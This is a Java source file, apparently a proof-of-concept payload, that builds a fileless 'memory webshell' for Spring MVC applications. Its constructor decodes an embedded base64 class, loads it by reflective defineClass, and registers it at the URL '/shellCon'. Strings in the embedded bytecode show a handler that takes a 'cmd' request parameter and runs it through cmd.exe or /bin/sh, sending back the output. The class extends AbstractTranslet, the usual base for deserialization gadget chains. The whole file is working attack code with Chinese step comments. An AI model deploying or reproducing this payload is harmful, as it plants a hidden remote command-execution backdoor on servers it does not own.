package POC;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;


public class AddBadController_bytes extends AbstractTranslet {
    public AddBadController_bytes() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        String className = "controller.BadController";
        String base64 = "yv66vgAAADQAiAoAIABHCABICwBJAEoLAEsATAgATQgATgoATwBQCgAMAFEIAFIKAAwAUwcAVAcAVQgAVggAVwoACwBYCABZCABaBwBbCgALAFwKAF0AXgoAEgBfCABgCgASAGEKABIAYgoAEgBjCgASAGQKAGUAZgoAZQBnCgBlAGQHAGgHAGkHAGoBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGkxjb250cm9sbGVyL0JhZENvbnRyb2xsZXI7AQAGYmFkQ29uAQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAARjb2RlAQANU3RhY2tNYXBUYWJsZQcAVQcAawcAVAcAWwcAaQcAbAcAbQcAaAEAGVJ1bnRpbWVWaXNpYmxlQW5ub3RhdGlvbnMBADhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nOwEABXZhbHVlAQAHL2JhZENvbgEAClNvdXJjZUZpbGUBABJCYWRDb250cm9sbGVyLmphdmEBACtMb3JnL3NwcmluZ2ZyYW1ld29yay9zdGVyZW90eXBlL0NvbnRyb2xsZXI7DAAhACIBAANjbWQHAGwMAG4AbwcAbQwAcABxAQAAAQAHb3MubmFtZQcAcgwAcwBvDAB0AHUBAAN3aW4MAHYAdwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACEAeAEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyDAB5AHoHAHsMAHwAfQwAIQB+AQACXEEMAH8AgAwAgQCCDACDAHUMAIQAIgcAawwAhQCGDACHACIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAYY29udHJvbGxlci9CYWRDb250cm9sbGVyAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAVjbG9zZQEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gAIQAfACAAAAAAAAIAAQAhACIAAQAjAAAALwABAAEAAAAFKrcAAbEAAAACACQAAAAGAAEAAAANACUAAAAMAAEAAAAFACYAJwAAAAEAKAApAAIAIwAAAaEABgAIAAAAqCsSArkAAwIATi3GAJ0suQAEAQA6BBIFOgUSBrgAB7YACBIJtgAKmQAhuwALWQa9AAxZAxINU1kEEg5TWQUtU7cADzoGpwAeuwALWQa9AAxZAxIQU1kEEhFTWQUtU7cADzoGuwASWRkGtgATtgAUtwAVEha2ABc6BxkHtgAYmQALGQe2ABmnAAUZBToFGQe2ABoZBBkFtgAbGQS2ABwZBLYAHacABToEsQABAA0AogClAB4AAwAkAAAAQgAQAAAAEAAJABEADQATABUAFAAZABYAKQAXAEcAGQBiABsAeAAcAIwAHQCRAB4AmAAfAJ0AIACiACIApQAhAKcAJQAlAAAAXAAJAEQAAwAqACsABgAVAI0ALAAtAAQAGQCJAC4ALwAFAGIAQAAqACsABgB4ACoAMAAxAAcAAACoACYAJwAAAAAAqAAyADMAAQAAAKgANAA1AAIACQCfADYALwADADcAAAA1AAb+AEcHADgHADkHADj8ABoHADr8ACUHADtBBwA4/wAaAAQHADwHAD0HAD4HADgAAQcAPwEAQAAAAA4AAQBBAAEAQlsAAXMAQwACAEQAAAACAEUAQAAAAAYAAQBGAAA=";
        byte[] decode = Base64.getDecoder().decode(base64);
        try {
            classLoader.loadClass(className);
        }catch (ClassNotFoundException e){
            java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            m0.setAccessible(true);
            m0.invoke(classLoader, className, decode, 0, decode.length);
        }

        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
        Method declaredMethod = Class.forName("controller.BadController").getDeclaredMethods()[0];
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/shellCon");
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        r.registerMapping(info, Class.forName("controller.BadController").newInstance(), declaredMethod);
        System.out.println("/shellCon has been created");
    }

    public AddBadController_bytes(String any){

    }








    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
